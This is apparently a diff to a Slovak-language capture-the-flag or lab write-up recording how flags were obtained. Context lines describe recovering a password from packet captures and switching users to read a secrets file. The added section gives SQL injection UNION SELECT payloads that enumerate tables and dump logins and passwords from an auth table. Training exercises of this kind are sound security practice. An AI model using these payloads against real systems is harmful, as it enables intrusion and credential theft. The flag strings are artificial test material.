@@ -13,3 +13,9 @@ TAJEMSTVI D
 presiel som pcapy s wireshark, po passworde v agg2 nasledovalo slovo nachystejteuzenace, skusil som prepnut usera na ada s tymto helsom, islo, v priecinku ada je subor secrets.txt
 Ziskali jste tajemstvi D_06-11-11-17-01_b6580a9663c7a360f578ffc43220898a4dcf74fd53c8dcb916f5d56f2efccf9b
 
+TAJEMSTVI A
+
+sql injection na 122.38, AND 1=2 UNION SELECT table_name, column_name, 1, 2 FROM information_schema.columns zikat tabulky a nazvy columns, kde som nasiel tabulku auth s columnmi id, login, passwd,
+dalej pomocou AND 1=2 UNION SELECT id, login, passwd, 2 FROM auth
+Ziskali jste tajemstvi A_06-11-18-39-01_b39755ba338f6368d3cc6769c9af9cba0e3bfc4ef6a961979f6d9d6b1e11
+
